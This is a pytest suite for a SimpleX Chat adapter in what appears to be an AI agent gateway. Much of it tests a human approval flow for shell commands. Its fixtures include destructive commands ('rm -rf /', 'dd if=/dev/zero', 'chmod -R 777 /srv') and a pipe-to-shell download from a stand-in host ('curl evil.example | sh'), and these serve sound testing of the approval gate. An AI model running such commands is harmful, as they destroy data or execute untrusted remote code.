"""Tests for the SimpleX Chat platform-plugin adapter.

Loaded via the ``_plugin_adapter_loader`` helper so this lives under
``plugin_adapter_simplex`` in ``sys.modules`` and cannot collide with
sibling platform-plugin tests on the same xdist worker.
"""

from __future__ import annotations

import asyncio
import json
import time
from unittest.mock import AsyncMock, MagicMock

import pytest

from tests.gateway._plugin_adapter_loader import load_plugin_adapter

_simplex = load_plugin_adapter("simplex")

SimplexAdapter = _simplex.SimplexAdapter
check_requirements = _simplex.check_requirements
validate_config = _simplex.validate_config
is_connected = _simplex.is_connected
register = _simplex.register
_env_enablement = _simplex._env_enablement
_standalone_send = _simplex._standalone_send
_guess_extension = _simplex._guess_extension
_is_image_ext = _simplex._is_image_ext
_is_audio_ext = _simplex._is_audio_ext
_CORR_PREFIX = _simplex._CORR_PREFIX


# ---------------------------------------------------------------------------
# 1. Platform enum (plugin-discovered, not bundled)
# ---------------------------------------------------------------------------

def test_platform_enum_resolves_via_plugin_scan():
    """The plugin filesystem scan should expose Platform("simplex")."""
    from gateway.config import Platform
    p = Platform("simplex")
    assert p.value == "simplex"
    # Identity stability — repeated lookups return the same pseudo-member
    assert Platform("simplex") is p


# ---------------------------------------------------------------------------
# 2. check_requirements / validate_config / is_connected
# ---------------------------------------------------------------------------


def test_check_requirements_true_when_configured(monkeypatch):
    monkeypatch.setenv("SIMPLEX_WS_URL", "ws://127.0.0.1:5225")
    # websockets is a dev dep in this repo via the test plugins; the
    # check_requirements() gate also asserts the package imports.
    websockets_present = True
    try:
        import websockets  # noqa: F401
    except ImportError:
        websockets_present = False
    assert check_requirements() is websockets_present


def test_validate_config_uses_env_or_extra():
    from gateway.config import PlatformConfig
    # Empty extra + no env → invalid
    cfg = PlatformConfig(enabled=True)
    assert validate_config(cfg) is False
    # extra-only path → valid
    cfg2 = PlatformConfig(enabled=True, extra={"ws_url": "ws://localhost:5225"})
    assert validate_config(cfg2) is True


def test_is_connected_mirrors_validate(monkeypatch):
    from gateway.config import PlatformConfig
    monkeypatch.delenv("SIMPLEX_WS_URL", raising=False)
    cfg = PlatformConfig(enabled=True, extra={"ws_url": "ws://x"})
    assert is_connected(cfg) is True
    assert is_connected(PlatformConfig(enabled=True)) is False


# ---------------------------------------------------------------------------
# 3. _env_enablement seeds PlatformConfig.extra
# ---------------------------------------------------------------------------


def test_env_enablement_seeds_home_channel(monkeypatch):
    monkeypatch.setenv("SIMPLEX_WS_URL", "ws://127.0.0.1:5225")
    monkeypatch.setenv("SIMPLEX_HOME_CHANNEL", "42")
    monkeypatch.setenv("SIMPLEX_HOME_CHANNEL_NAME", "Personal")
    seed = _env_enablement()
    assert seed["home_channel"] == {"chat_id": "42", "name": "Personal"}


# ---------------------------------------------------------------------------
# 4. Adapter init
# ---------------------------------------------------------------------------

def test_adapter_init_custom_url():
    from gateway.config import PlatformConfig
    cfg = PlatformConfig(enabled=True, extra={"ws_url": "ws://localhost:5225"})
    adapter = SimplexAdapter(cfg)
    assert adapter.ws_url == "ws://localhost:5225"
    assert adapter._running is False
    assert adapter._ws is None


# ---------------------------------------------------------------------------
# 5. Helper functions (magic-byte detection)
# ---------------------------------------------------------------------------

def test_guess_extension_png():
    assert _guess_extension(b"\x89PNG\r\n\x1a\n") == ".png"


# ---------------------------------------------------------------------------
# 6. Correlation IDs
# ---------------------------------------------------------------------------


def test_corr_id_pending_set_self_trims():
    from gateway.config import PlatformConfig
    cfg = PlatformConfig(enabled=True, extra={"ws_url": "ws://localhost:5225"})
    adapter = SimplexAdapter(cfg)
    adapter._max_pending_corr = 4
    for _ in range(10):
        adapter._make_corr_id()
    # After many additions, the pending set should be bounded by the trim
    # logic — at most one trim window above the cap.
    assert len(adapter._pending_corr_ids) <= adapter._max_pending_corr + 1


# ---------------------------------------------------------------------------
# 7. Outbound send (mocked WS)
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_send_dm():
    """DMs use the structured ``/_send @<id> json [...]`` form.

    The bare ``@<id> text`` chat-command form is unreliable — the
    daemon silently drops messages when it cannot resolve the display
    name.  The structured ``/_send`` form addresses by ID and
    survives newlines/quoting through ``json.dumps``, matching what
    ``send_image`` and ``send_document`` already do.
    """
    from gateway.config import PlatformConfig
    cfg = PlatformConfig(enabled=True, extra={"ws_url": "ws://localhost:5225"})
    adapter = SimplexAdapter(cfg)

    mock_ws = AsyncMock()
    adapter._ws = mock_ws

    result = await adapter.send("contact-42", "Hello, SimpleX!")
    mock_ws.send.assert_called_once()
    payload = json.loads(mock_ws.send.call_args[0][0])
    assert payload["cmd"].startswith("/_send @contact-42 json ")
    msg_content = json.loads(payload["cmd"].split(" json ", 1)[1])[0][
        "msgContent"
    ]
    assert msg_content == {"type": "text", "text": "Hello, SimpleX!"}
    assert payload["corrId"].startswith(_CORR_PREFIX)
    assert result.success is True



@pytest.mark.asyncio
async def test_send_group():
    """Groups use the structured ``/_send #<id> json [...]`` form.

    The bracket chat-command form ``#[<id>] text`` *looks* like an exact
    ID match in the daemon docs but is parsed as a display-name lookup
    — so messages to groups whose display name isn't literally the ID
    silently drop. The structured ``/_send`` form addresses by numeric
    ID and survives newlines/quoting through ``json.dumps``.
    """
    from gateway.config import PlatformConfig
    cfg = PlatformConfig(enabled=True, extra={"ws_url": "ws://localhost:5225"})
    adapter = SimplexAdapter(cfg)

    mock_ws = AsyncMock()
    adapter._ws = mock_ws

    result = await adapter.send("group:grp-99", "Hello, group!")
    payload = json.loads(mock_ws.send.call_args[0][0])
    assert payload["cmd"].startswith("/_send #grp-99 json ")
    msg_content = json.loads(payload["cmd"].split(" json ", 1)[1])[0][
        "msgContent"
    ]
    assert msg_content == {"type": "text", "text": "Hello, group!"}
    assert result.success is True


# ---------------------------------------------------------------------------
# 7b. Channel directory enumeration (list_channels)
# ---------------------------------------------------------------------------


def _adapter_with_ws():
    from gateway.config import PlatformConfig
    cfg = PlatformConfig(enabled=True, extra={"ws_url": "ws://localhost:5225"})
    adapter = SimplexAdapter(cfg)
    adapter._ws = AsyncMock()
    return adapter


@pytest.mark.asyncio
async def test_list_channels_contacts_and_groups():
    adapter = _adapter_with_ws()

    async def fake_send_command(command, timeout=30.0):
        if command == "/contacts":
            return {
                "contacts": [
                    {"contactId": 1, "localDisplayName": "alice"},
                    {"contactId": 2, "profile": {"displayName": "bob"}},
                    "garbage",
                ]
            }
        if command == "/groups":
            return {
                "groups": [
                    {"groupId": 7, "localDisplayName": "friends"},
                    # [groupInfo, groupSummary] pair form
                    [{"groupId": 9, "groupProfile": {"displayName": "work"}}, {}],
                ]
            }
        return None

    adapter._send_command = fake_send_command
    channels = await adapter.list_channels()

    assert {"id": "alice", "name": "alice", "type": "dm"} in channels
    assert {"id": "bob", "name": "bob", "type": "dm"} in channels
    assert {"id": "group:7", "name": "friends", "type": "group"} in channels
    assert {"id": "group:9", "name": "work", "type": "group"} in channels


@pytest.mark.asyncio
async def test_list_channels_returns_none_when_disconnected():
    """None (not []) so the directory falls back to session discovery."""
    from gateway.config import PlatformConfig
    cfg = PlatformConfig(enabled=True, extra={"ws_url": "ws://localhost:5225"})
    adapter = SimplexAdapter(cfg)
    assert adapter._ws is None
    assert await adapter.list_channels() is None


@pytest.mark.asyncio
async def test_list_channels_returns_none_on_contacts_timeout():
    adapter = _adapter_with_ws()

    async def fake_send_command(command, timeout=30.0):
        return None  # daemon unresponsive

    adapter._send_command = fake_send_command
    assert await adapter.list_channels() is None


# ---------------------------------------------------------------------------
# 8. Inbound: filter own-echo by corrId prefix
# ---------------------------------------------------------------------------


# ---------------------------------------------------------------------------
# 9. Standalone (out-of-process) send for cron
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_standalone_send_missing_websockets(monkeypatch):
    """When websockets is unimportable, return a clean error dict.

    Implementation detail: the standalone path does ``import websockets``
    inside the function body. We simulate the package being absent by
    pulling it out of ``sys.modules`` and pointing the finder at None.
    """
    import sys
    saved_websockets = sys.modules.pop("websockets", None)
    saved_meta = list(sys.meta_path)

    class _Blocker:
        @staticmethod
        def find_spec(name, path=None, target=None):
            if name == "websockets" or name.startswith("websockets."):
                raise ImportError("websockets blocked for test")
            return None

    sys.meta_path.insert(0, _Blocker())
    try:
        pconfig = MagicMock()
        pconfig.extra = {"ws_url": "ws://localhost:5225"}
        result = await _standalone_send(pconfig, "contact-42", "hi")
        assert isinstance(result, dict)
        assert "error" in result
        assert "websockets" in result["error"]
    finally:
        sys.meta_path[:] = saved_meta
        if saved_websockets is not None:
            sys.modules["websockets"] = saved_websockets


@pytest.mark.asyncio
async def test_standalone_send_defaults_to_local_daemon(monkeypatch):
    monkeypatch.delenv("SIMPLEX_WS_URL", raising=False)
    pconfig = MagicMock()
    pconfig.extra = {}

    sent_payloads = []

    class DummyWs:
        async def __aenter__(self):
            return self

        async def __aexit__(self, exc_type, exc, tb):
            return None

        async def send(self, payload):
            sent_payloads.append(json.loads(payload))

    def fake_connect(url, **kwargs):
        assert url == "ws://127.0.0.1:5225"
        assert kwargs["open_timeout"] == 10
        assert kwargs["close_timeout"] == 5
        return DummyWs()

    import websockets
    monkeypatch.setattr(websockets, "connect", fake_connect)

    result = await _standalone_send(pconfig, "contact-42", "hi")
    assert result == {"success": True, "platform": "simplex", "chat_id": "contact-42"}
    assert sent_payloads[0]["cmd"].startswith("/_send @contact-42 json ")
    msg_content = json.loads(
        sent_payloads[0]["cmd"].split(" json ", 1)[1]
    )[0]["msgContent"]
    assert msg_content == {"type": "text", "text": "hi"}


@pytest.mark.asyncio
async def test_health_monitor_does_not_reconnect_quiet_healthy_ws(monkeypatch):
    from gateway.config import PlatformConfig
    cfg = PlatformConfig(enabled=True, extra={"ws_url": "ws://localhost:5225"})
    adapter = SimplexAdapter(cfg)
    adapter._running = True
    adapter._last_ws_activity = 0
    adapter._ws = AsyncMock()

    monkeypatch.setattr(_simplex, "HEALTH_CHECK_INTERVAL", 0.01)
    monkeypatch.setattr(_simplex, "HEALTH_CHECK_STALE_THRESHOLD", 0.01)

    task = asyncio.create_task(adapter._health_monitor())
    await asyncio.sleep(0.03)
    adapter._running = False
    await asyncio.wait_for(task, timeout=1)

    adapter._ws.close.assert_not_called()




# ---------------------------------------------------------------------------
# 10. register() — plugin-side metadata
# ---------------------------------------------------------------------------


# ---------------------------------------------------------------------------
# Inbound attachment message type classification
# ---------------------------------------------------------------------------

def _make_file_chat_item(file_path: str, file_name: str) -> dict:
    """Minimal direct-chat rcvMsgContent item carrying a completed file."""
    return {
        "chatInfo": {
            "type": "direct",
            "contact": {"contactId": 42, "localDisplayName": "tester"},
        },
        "chatItem": {
            "chatDir": {"type": "directRcv"},
            "meta": {"itemTs": "2026-01-01T00:00:00Z"},
            "content": {
                "type": "rcvMsgContent",
                "msgContent": {"type": "file", "text": "here you go"},
            },
            "file": {
                "fileId": 7,
                "fileName": file_name,
                "fileSource": {"filePath": file_path},
            },
        },
    }


# ---------------------------------------------------------------------------
# 11. Reaction-based exec approvals
# ---------------------------------------------------------------------------

def _choice_table():
    """The adapter's (emoji, choice, label) table, resolved at call time."""
    return _simplex._APPROVAL_CHOICES


def _approval_adapter(
    reaction_response=None, item_id=501, reject_emoji=None, reaction_cap=None
):
    """Adapter plus a fake daemon that records every command it is sent.

    ``/_send`` answers with a ``newChatItems`` reply carrying *item_id* so
    the approval prompt has an anchor; ``/_reaction`` answers with
    *reaction_response* (default: accepted), or with a command error for the
    single emoji named in *reject_emoji*.

    *reaction_cap* models the real daemon's per-sender reaction limit
    (three on simplex-chat v7.0.0.11): once that many reactions are held on
    an item, the next ``on`` answers ``commandError: "too many reactions"``.
    """
    adapter = _adapter_with_ws()
    sent = []
    timeouts = {}
    held = {}

    async def fake_send_command(command, timeout=30.0, **_kwargs):
        sent.append(command)
        timeouts[command.split(" ", 1)[0]] = timeout
        if command.startswith("/_send "):
            return {
                "type": "newChatItems",
                "chatItems": [
                    {
                        "chatInfo": {"type": "direct"},
                        "chatItem": {"meta": {"itemId": adapter._next_item_id}},
                    }
                ],
            }
        if command.startswith("/_reaction "):
            if reject_emoji is not None and f'"{reject_emoji}"' in command:
                return {"type": "chatCmdError", "chatError": {}}
            if reaction_cap is not None:
                item = command.split(" ")[2]
                on = " on " in command
                if on and held.get(item, 0) >= reaction_cap:
                    return {
                        "type": "chatCmdError",
                        "chatError": {
                            "type": "error",
                            "errorType": {
                                "type": "commandError",
                                "message": "too many reactions",
                            },
                        },
                    }
                held[item] = held.get(item, 0) + (1 if on else -1)
            if reaction_response is not None:
                return reaction_response
            return {"type": "chatItemReaction", "added": True}
        return None

    adapter._send_command = fake_send_command
    adapter._command_timeouts = timeouts
    # Tests that send a second prompt bump this so the fake daemon hands back
    # a fresh chat-item id, the way a real one would.
    adapter._next_item_id = item_id
    return adapter, sent


async def _drain(adapter):
    """Await the adapter's detached reaction seed/cleanup tasks."""
    for _ in range(10):
        pending = [t for t in adapter._background_tasks if not t.done()]
        if not pending:
            return
        await asyncio.gather(*pending, return_exceptions=True)


def _prompt_text(sent):
    """Pull the prompt body back out of the recorded ``/_send`` command."""
    send_cmds = [c for c in sent if c.startswith("/_send ")]
    assert send_cmds, "no /_send command was recorded"
    composed = json.loads(send_cmds[-1].split(" json ", 1)[1])
    return composed[0]["msgContent"]["text"]


def _ws_frames(adapter):
    """Every raw command the adapter pushed straight at the socket."""
    return [
        json.loads(call[0][0])["cmd"]
        for call in adapter._ws.send.call_args_list
    ]


def _ws_texts(adapter):
    """Message bodies the adapter pushed at the socket, decoded.

    Both outbound forms are unwrapped: the structured ``/_send <ref> json``
    payload the approval flow uses, and the bare ``@<name> <text>`` form
    ``send()`` still uses when a chat has no numeric ChatRef.
    """
    texts = []
    for cmd in _ws_frames(adapter):
        if cmd.startswith("/_send ") and " json " in cmd:
            composed = json.loads(cmd.split(" json ", 1)[1])
            texts.append(composed[0]["msgContent"]["text"])
        elif cmd[:1] in ("@", "#"):
            texts.append(cmd.split(" ", 1)[1] if " " in cmd else "")
        else:
            texts.append(cmd)
    return texts


def _reaction_commands(sent, toggle="on"):
    return [
        c for c in sent
        if c.startswith("/_reaction ") and f" {toggle} " in c
    ]


def _reaction_emoji(command):
    return json.loads(command.split(" on ", 1)[1].split(" off ", 1)[-1])["emoji"]


def _reaction_event(
    emoji,
    *,
    item_id=501,
    added=True,
    dir_type="directRcv",
    contact_id=42,
    member=None,
    chat_info=None,
):
    """A daemon ``chatItemReaction`` event in the documented ACIReaction shape."""
    chat_dir = {"type": dir_type}
    if member is not None:
        chat_dir["groupMember"] = member
    if chat_info is None:
        chat_info = {
            "type": "direct",
            "contact": {
                "contactId": contact_id,
                "localDisplayName": "tester",
            },
        }
    return {
        "resp": {
            "type": "chatItemReaction",
            "added": added,
            "reaction": {
                "chatInfo": chat_info,
                "chatReaction": {
                    "chatDir": chat_dir,
                    "chatItem": {"meta": {"itemId": item_id}},
                    "sentAt": "2026-01-01T00:00:00Z",
                    "reaction": {"type": "emoji", "emoji": emoji},
                },
            },
        }
    }


@pytest.fixture
def resolved_approvals(monkeypatch):
    """Capture calls into ``tools.approval.resolve_gateway_approval``.

    The adapter imports it lazily inside the handler, so patching the module
    attribute is what the real call site sees.
    """
    import tools.approval as approval_mod

    calls = []
    state = {"count": 1}

    def fake_resolve(session_key, choice, *args, **kwargs):
        calls.append((session_key, choice))
        return state["count"]

    monkeypatch.setattr(approval_mod, "resolve_gateway_approval", fake_resolve)
    return calls, state


@pytest.mark.asyncio
async def test_exec_approval_anchors_prompt_and_seeds_reactions():
    """The prompt is sent via /_send so its itemId can anchor reactions."""
    adapter, sent = _approval_adapter()

    result = await adapter.send_exec_approval(
        chat_id="42",
        command="rm -rf /tmp/scratch",
        session_key="simplex:42",
        description="recursive delete",
    )
    await _drain(adapter)

    assert result.success is True
    assert result.message_id == "501"

    text = _prompt_text(sent)
    assert "rm -rf /tmp/scratch" in text
    assert "recursive delete" in text
    # The typed lane survives in the prompt no matter what reactions do.
    assert "/approve" in text and "/deny" in text

    seeds = _reaction_commands(sent)
    assert [_reaction_emoji(c) for c in seeds] == [c[0] for c in _choice_table()]
    assert seeds[0].startswith("/_reaction @42 501 on ")


@pytest.mark.asyncio
async def test_exec_approval_legend_matches_seeded_emoji():
    """Every advertised reaction is one that is actually on the message.

    The legend is written from the taps that landed, not from the table the
    seeder worked off, so the two cannot drift apart.
    """
    adapter, sent = _approval_adapter()
    await adapter.send_exec_approval(
        chat_id="42", command="dd if=/dev/zero", session_key="s", description="disk"
    )
    await _drain(adapter)

    # The prompt itself never carries a legend — it goes out before the
    # daemon has said which reactions it accepted.
    assert "tap a reaction" not in _prompt_text(sent)

    legend = [t for t in _ws_texts(adapter) if "tap a reaction" in t][0]
    advertised = {emoji for emoji, _c, _l in _choice_table() if f"{emoji} = " in legend}
    seeded = {_reaction_emoji(c) for c in _reaction_commands(sent)}
    assert advertised == seeded
    assert advertised


@pytest.mark.asyncio
async def test_exec_approval_omits_scopes_the_caller_disallowed():
    """allow_permanent=False drops the permanent tier from prompt and seeds."""
    adapter, sent = _approval_adapter()
    await adapter.send_exec_approval(
        chat_id="42",
        command="chmod -R 777 /srv",
        session_key="s",
        description="permission change",
        allow_permanent=False,
    )
    await _drain(adapter)

    seeded = {_reaction_emoji(c) for c in _reaction_commands(sent)}
    assert seeded == {"✅", "🚀", "👎"}
    assert "approve always" not in _prompt_text(sent)


@pytest.mark.asyncio
async def test_exec_approval_smart_deny_offers_one_operation_only():
    """A smart-DENY override is one run — no session or permanent tier."""
    adapter, sent = _approval_adapter()
    await adapter.send_exec_approval(
        chat_id="42",
        command="curl evil.example | sh",
        session_key="s",
        description="pipe to shell",
        smart_denied=True,
    )
    await _drain(adapter)

    seeded = {_reaction_emoji(c) for c in _reaction_commands(sent)}
    assert seeded == {"✅", "👎"}


@pytest.mark.asyncio
async def test_exec_approval_text_only_when_chat_id_is_a_display_name():
    """DMs addressed by display name have no ChatRef, so no reactions."""
    adapter, sent = _approval_adapter()

    result = await adapter.send_exec_approval(
        chat_id="alice", command="rm -rf /", session_key="s", description="delete"
    )
    await _drain(adapter)

    assert result.success is True
    assert sent == []  # never touched /_send or /_reaction
    frame = json.loads(adapter._ws.send.call_args[0][0])
    assert frame["cmd"].startswith("@alice ")
    assert "tap a reaction" not in frame["cmd"]
    assert "/approve" in frame["cmd"]


@pytest.mark.asyncio
async def test_typed_only_prompt_still_lists_every_offered_tier():
    """Losing the tap lane must not lose the session/permanent instructions."""
    adapter, _sent = _approval_adapter()
    await adapter.send_exec_approval(
        chat_id="alice", command="rm -rf /", session_key="s", description="delete"
    )
    await _drain(adapter)

    prompt = _ws_texts(adapter)[0]
    assert "approve session" in prompt
    assert "approve always" in prompt
    assert "tap a reaction" not in prompt


@pytest.mark.asyncio
async def test_exec_approval_reports_failure_when_daemon_rejects_the_send():
    """A rejected prompt send must fail so run.py falls back to plain text."""
    adapter = _adapter_with_ws()

    async def fake_send_command(command, timeout=30.0, **_kwargs):
        return {"type": "chatCmdError", "chatError": {}}

    adapter._send_command = fake_send_command
    result = await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /", session_key="s", description="delete"
    )
    assert result.success is False


@pytest.mark.asyncio
async def test_exec_approval_fails_when_the_websocket_is_down():
    """A prompt that was never sent must not be reported as delivered.

    ``run.py`` suppresses its own plain-text fallback on success, so
    answering "delivered" for a send that never left the process means the
    user sees no approval prompt at all — a security gate that silently
    disappears.
    """
    from gateway.config import PlatformConfig
    cfg = PlatformConfig(enabled=True, extra={"ws_url": "ws://localhost:5225"})
    adapter = SimplexAdapter(cfg)
    assert adapter._ws is None

    result = await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /", session_key="s", description="delete"
    )
    assert result.success is False


@pytest.mark.asyncio
async def test_anchored_send_leaves_headroom_under_the_caller_budget():
    """gateway/run.py abandons send_exec_approval after 15s.

    Waiting the full 15 here means a slow daemon produces two approval
    prompts for one command.
    """
    adapter, _sent = _approval_adapter()
    await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/x", session_key="s", description="delete"
    )
    await _drain(adapter)

    assert adapter._command_timeouts["/_send"] < 15.0


@pytest.mark.asyncio
async def test_prompt_window_follows_the_configured_approval_timeout(monkeypatch):
    """The tap window is the operator's approvals.timeout, not a constant."""
    import tools.approval as approval_mod

    monkeypatch.setattr(approval_mod, "_get_approval_timeout", lambda: 900)

    adapter, _sent = _approval_adapter()
    before = time.monotonic()
    await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/x", session_key="s", description="delete"
    )
    await _drain(adapter)

    prompt = adapter._approval_prompts_by_item["501"]
    assert prompt.expires_at - before == pytest.approx(900, abs=5)


@pytest.mark.asyncio
async def test_expired_prompts_are_swept_when_the_next_prompt_is_sent():
    """Prompts nobody ever answered must not accumulate for the process life."""
    adapter, _sent = _approval_adapter()
    await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/a", session_key="s1", description="delete"
    )
    await _drain(adapter)
    adapter._approval_prompts_by_item["501"].expires_at = 0.0

    adapter._next_item_id = 777
    await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /tmp/b", session_key="s2", description="delete"
    )
    await _drain(adapter)

    assert list(adapter._approval_prompts_by_item) == ["777"]
    assert "s1" not in adapter._approval_prompt_by_session


# ---------------------------------------------------------------------------
# 11a. One live prompt per session — the tap must be unambiguous
# ---------------------------------------------------------------------------


async def _two_prompts_one_session(adapter, sent):
    """Send prompt A (item 501), then prompt B in the same session."""
    await adapter.send_exec_approval(
        chat_id="42", command="touch /tmp/live-A", session_key="s",
        description="create A",
    )
    await _drain(adapter)
    adapter._ws.send.reset_mock()

    adapter._next_item_id = 777
    await adapter.send_exec_approval(
        chat_id="42", command="touch /tmp/live-B", session_key="s",
        description="create B",
    )
    await _drain(adapter)


@pytest.mark.asyncio
async def test_second_approval_withdraws_the_first_prompt():
    """The superseded message must stop looking answerable, and say so.

    ``resolve_gateway_approval`` is FIFO per session (upstream #64001): a tap
    cannot name a queue entry. Leaving the old message decorated with four
    live-looking emoji is what turns that into a wrong-command execution.
    """
    adapter, sent = _approval_adapter()
    await _two_prompts_one_session(adapter, sent)

    first = [c for c in _reaction_commands(sent, toggle="off") if " 501 " in c]
    assert len(first) == len(_choice_table())  # every seed taken back off
    assert adapter._approval_prompts_by_item == {}

    notice = "\n".join(_ws_texts(adapter))
    assert "superseded" in notice
    assert "/approve" in notice


@pytest.mark.asyncio
async def test_second_approval_in_a_session_is_typed_only():
    """With two approvals pending, neither one may offer a tap."""
    adapter, sent = _approval_adapter()
    await _two_prompts_one_session(adapter, sent)

    # The second prompt went out as an ordinary message, not an anchored one.
    assert [c for c in sent if c.startswith("/_send ")] == [
        c for c in sent if c.startswith("/_send @42 json ") and "live-A" in c
    ]
    second = [t for t in _ws_texts(adapter) if "live-B" in t]
    assert len(second) == 1
    assert "tap a reaction" not in second[0]
    assert "/approve" in second[0]
    assert adapter._approval_prompts_by_item == {}


async def _two_simultaneous_prompts_one_session(adapter):
    """Interleave two calls at the awaited prompt send, then let both finish.

    Both calls pass the single-live-prompt check before either registers —
    the sequential guard cannot see an in-flight peer. Returns the two
    SendResults.
    """
    real = adapter._send_anchored_text
    gate = asyncio.Event()

    async def gated(chat_ref, text):
        await gate.wait()
        return await real(chat_ref, text)

    adapter._send_anchored_text = gated

    first = asyncio.ensure_future(
        adapter.send_exec_approval(
            chat_id="42", command="touch /tmp/race-A", session_key="s",
            description="create A",
        )
    )
    await asyncio.sleep(0)  # first is parked inside the gated send
    second = asyncio.ensure_future(
        adapter.send_exec_approval(
            chat_id="42", command="touch /tmp/race-B", session_key="s",
            description="create B",
        )
    )
    await asyncio.sleep(0)  # second enters, sees the in-flight peer
    gate.set()
    results = await asyncio.gather(first, second)
    await _drain(adapter)
    return results


@pytest.mark.asyncio
async def test_simultaneous_approvals_in_one_session_hold_the_typed_lane():
    """Two calls interleaved at the prompt send must end with zero tap lanes.

    The later entrant takes the typed lane; the earlier one withdraws its
    own prompt when it resumes and finds the queue grew under it. A tap on
    either message must have nothing left to answer.
    """
    adapter, sent = _approval_adapter()
    results = await _two_simultaneous_prompts_one_session(adapter)

    assert all(r.success for r in results)
    # No live tap prompt survived, and the session is latched typed.
    assert adapter._approval_prompts_by_item == {}
    assert adapter._typed_only_sessions.get("s", 0.0) > time.monotonic()
    # The overlapped prompt went out typed — instructions intact, no legend.
    second_texts = [t for t in _ws_texts(adapter) if "race-B" in t]
    assert len(second_texts) == 1
    assert "tap a reaction" not in second_texts[0]
    assert "/approve" in second_texts[0]
    # The first prompt was withdrawn, and said so.
    assert "superseded" in "\n".join(_ws_texts(adapter))


@pytest.mark.asyncio
async def test_overlap_bookkeeping_drains_when_both_calls_return():
    """The in-flight maps must not leak entries once every call is done."""
    adapter, _sent = _approval_adapter()
    await _two_simultaneous_prompts_one_session(adapter)

    assert adapter._approval_inflight == {}
    assert adapter._approval_entry_gen == {}


@pytest.mark.asyncio
async def test_a_session_that_piled_up_stays_typed_until_the_window_lapses():
    """The third prompt must not get a tap lane back.

    Answering by typing is invisible to this adapter, so after a pile-up the
    prompt map goes empty while two unanswered commands are still queued in
    core. Offering a tap on a third prompt would run the oldest of them.
    """
    adapter, sent = _approval_adapter()
    await _two_prompts_one_session(adapter, sent)

    adapter._next_item_id = 888
    adapter._ws.send.reset_mock()
    await adapter.send_exec_approval(
        chat_id="42", command="touch /tmp/live-C", session_key="s",
        description="create C",
    )
    await _drain(adapter)

    assert adapter._approval_prompts_by_item == {}
    third = [t for t in _ws_texts(adapter) if "live-C" in t]
    assert len(third) == 1
    assert "tap a reaction" not in third[0]

    # ...and it comes back once the window has lapsed.
    adapter._typed_only_sessions["s"] = 0.0
    adapter._next_item_id = 999
    await adapter.send_exec_approval(
        chat_id="42", command="touch /tmp/live-D", session_key="s",
        description="create D",
    )
    await _drain(adapter)
    assert list(adapter._approval_prompts_by_item) == ["999"]


@pytest.mark.asyncio
async def test_tap_on_a_withdrawn_prompt_resolves_nothing(resolved_approvals):
    """The whole point of the guard: a stale tap cannot execute anything."""
    calls, _state = resolved_approvals
    adapter, sent = _approval_adapter()
    await _two_prompts_one_session(adapter, sent)

    await adapter._handle_event(_reaction_event("✅", item_id=501))
    await _drain(adapter)

    assert calls == []


@pytest.mark.asyncio
async def test_a_prompt_lost_to_a_dead_socket_keeps_the_session_typed_only(
    resolved_approvals,
):
    """A prompt the user never saw still holds the session to typing.

    ``tools/approval`` queues the approval before it notifies the adapter, so
    a send that never leaves the process leaves command A pending in core with
    no message of its own. If the socket then recovers and command B pends in
    the same session, an unguarded adapter sees an empty prompt map, offers
    the tap lane for B, and a tap resolves the FIFO head — A, which the user
    never read.
    """
    calls, _state = resolved_approvals
    adapter, _sent = _approval_adapter()

    # A: WebSocket down. Nothing is sent, nothing is registered — but core
    # has already queued it and will hold it for the approval window.
    live_ws, adapter._ws = adapter._ws, None
    result = await adapter.send_exec_approval(
        chat_id="42", command="touch /tmp/unseen-A", session_key="s",
        description="create A",
    )
    assert result.success is False

    # The inner reconnect loop restores the socket without touching state.
    adapter._ws = live_ws

    # B: same session, and this one the user actually reads.
    await adapter.send_exec_approval(
        chat_id="42", command="touch /tmp/seen-B", session_key="s",
        description="create B",
    )
    await _drain(adapter)

    assert adapter._approval_prompts_by_item == {}
    prompt_b = [t for t in _ws_texts(adapter) if "seen-B" in t]
    assert len(prompt_b) == 1
    assert "tap a reaction" not in prompt_b[0]
    assert "/approve" in prompt_b[0]

    # ...so a tap on B cannot run A.
    await adapter._handle_event(_reaction_event("✅", item_id=501))
    await _drain(adapter)
    assert calls == []


@pytest.mark.asyncio
async def test_an_unanchored_prompt_keeps_the_session_typed_only(resolved_approvals):
    """An anchored send that timed out registers nothing — same hole.

    The message may well have been delivered, so this path reports success,
    but no item id came back and no prompt is tracked. Command A stays queued
    in core and invisible to the single-prompt guard.
    """
    calls, _state = resolved_approvals
    adapter, _sent = _approval_adapter()
    daemon = adapter._send_command
    slow = {"send": True}

    async def flaky_send_command(command, timeout=30.0, **kwargs):
        if slow["send"] and command.startswith("/_send "):
            return None  # daemon slower than the anchored-send budget
        return await daemon(command, timeout=timeout, **kwargs)

    adapter._send_command = flaky_send_command

    result = await adapter.send_exec_approval(
        chat_id="42", command="touch /tmp/unanchored-A", session_key="s",
        description="create A",
    )
    assert result.success is True
    assert adapter._approval_prompts_by_item == {}

    slow["send"] = False
    await adapter.send_exec_approval(
        chat_id="42", command="touch /tmp/seen-B", session_key="s",
        description="create B",
    )
    await _drain(adapter)

    assert adapter._approval_prompts_by_item == {}
    prompt_b = [t for t in _ws_texts(adapter) if "seen-B" in t]
    assert len(prompt_b) == 1
    assert "tap a reaction" not in prompt_b[0]

    await adapter._handle_event(_reaction_event("✅", item_id=501))
    await _drain(adapter)
    assert calls == []


@pytest.mark.asyncio
async def test_a_send_that_raised_is_not_reported_as_delivered():
    """A write that raised delivered nothing, and must not claim otherwise.

    ``_send_command`` returns ``None`` for a reply timeout *and* for a failed
    write; only the first means "possibly delivered". Conflating them told
    ``run.py`` the prompt was out — suppressing its plain-text fallback — for
    a message that never reached the socket.
    """
    adapter = _adapter_with_ws()
    adapter._ws.send = AsyncMock(side_effect=ConnectionResetError("socket died"))

    result = await adapter.send_exec_approval(
        chat_id="42", command="rm -rf /", session_key="s", description="delete"
    )

    assert result.success is False
    assert adapter._approval_prompts_by_item == {}
    assert adapter._typed_only_sessions.get("s", 0.0) > time.monotonic()


@pytest.mark.asyncio
async def test_a_typed_fallback_still_withdraws_the_live_prompt(resolved_approvals):
    """The guard runs before every return, not just the happy path.

    A second approval that falls back to plain text for any reason used to
    leave the first message tappable, and a tap on it resolved the *newer*
    command — the queue is FIFO and the tap carries no id.
    """
    calls, _state = resolved_approvals
